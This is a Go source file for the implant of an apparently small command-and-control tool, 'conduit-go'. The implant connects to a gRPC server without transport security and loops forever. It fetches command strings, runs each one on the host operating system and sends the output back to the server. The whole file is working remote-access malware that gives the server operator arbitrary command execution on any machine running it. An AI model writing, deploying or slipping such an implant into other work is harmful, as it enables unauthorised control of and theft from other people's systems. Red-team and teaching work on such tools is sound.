package main

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/vpaklatzis/conduit-go/config"
	"github.com/vpaklatzis/conduit-go/logger"
	"github.com/vpaklatzis/conduit-go/pb"
	"go.uber.org/zap"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

// the implant executes the operating system command and sends the output
// back to the server
func main() {
	var (
		conn   *grpc.ClientConn
		err    error
		client pb.ImplantClient
		log    logger.Logger
		conf   config.Config
	)
	env := os.Getenv("ENVIRONMENT")
	if env == "" || env == "dev" {
		env = "dev"
		logger, _ := zap.NewDevelopment()
		defer logger.Sync()
		log = logger.Sugar()
		conf = config.LoadConfig("dev.env", "../env")
	} else {
		logger, _ := zap.NewProduction()
		defer logger.Sync()
		log = logger.Sugar()
		conf = config.LoadConfig("test.env", "../env")
	}
	requestUri := fmt.Sprintf("%s:%s", conf.GrpcImplantHost, conf.GrpcImplantPort)
	if conn, err = grpc.Dial(requestUri, grpc.WithTransportCredentials(insecure.NewCredentials())); err != nil {
		log.Fatal("Implant client could not connect to the server: ", err)
	}
	log.Info("Connected successfully to the implant server")
	defer func(conn *grpc.ClientConn) {
		if err := conn.Close(); err != nil {
			log.Fatal("Error occurred while closing the connection: ", err)
		}
	}(conn)
	client = pb.NewImplantClient(conn)

	ctx := context.Background()
	// infinite loop. Polls the implant server repeatedly. If the response it receives is empty,
	// it pauses for three seconds and tries again
	for {
		var req = new(pb.Empty)
		cmd, err := client.FetchCommand(ctx, req)
		if err != nil {
			log.Fatal("Error occurred while trying to fetch the command: ", err)
		}
		if cmd.In == "" {
			time.Sleep(3 * time.Second)
			continue
		}
		tokens := strings.Split(cmd.In, " ")
		var c *exec.Cmd
		if len(tokens) == 1 {
			c = exec.Command(tokens[0])
		} else {
			c = exec.Command(tokens[0], tokens[1:]...)
		}
		buf, err := c.CombinedOutput()
		if err != nil {
			cmd.Out = err.Error()
		}
		cmd.Out += string(buf)
		log.Infof("Out: %s", cmd.Out)
		_, err = client.SendOutput(ctx, cmd)
		if err != nil {
			log.Fatalf("Failed to send the output to the server", err.Error())
			return
		}
	}
}
